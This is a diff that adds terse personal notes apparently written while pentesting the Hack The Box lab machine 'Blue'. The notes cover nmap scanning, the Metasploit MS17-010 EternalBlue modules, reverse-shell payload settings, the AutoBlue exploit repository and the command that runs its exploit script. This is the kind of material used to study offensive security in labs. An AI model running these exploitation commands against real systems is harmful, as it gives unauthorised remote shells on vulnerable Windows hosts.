@@ -138,3 +138,46 @@ Goo hash $1$ -- hashcat - His YouTube -- Cracking linux password hashes**
 ftp 10.10.10.3
 anonymous
 anonymous
+
+BLUE
+nmap -A -T4 -p- 10.10.10.40
+smb
+Windows 7 - ethernal blue
+active directory pentesting
+search ms17-010
+
+use auxiliary/scanner/smb/smb_ms17_010
+use exploit/windows/smb/ms17_010_eternalblue
+whoami
+hostname
+
+set payload windows + TAB 
+set payload windows/x64/met + TAB
+exploit(windows/smb/ms17_010_eternalblue) > set payload payload/windows/x64/meterpreter/reverse_tcp
+shell/reverse_tcp is staged payload
+shell_reverse_tcp is unstaged payload
+try both
+
+payload => windows/x64/shell_reverse_tcp
+payload => windows/x64/shell/reverse_tcp
+
+Goo -> autoblue Github
+https://github.com/3ndG4me/AutoBlue-MS17-010
+4445
+4446
+0
+0 -> metasploit
+./listener_prep.sh
+4445
+4446
+0
+0
+
+python eternalblue_exploit7.py 10.10.10.40 ./shellcode/sc_all.bin
+
+
+
+
+
+
+
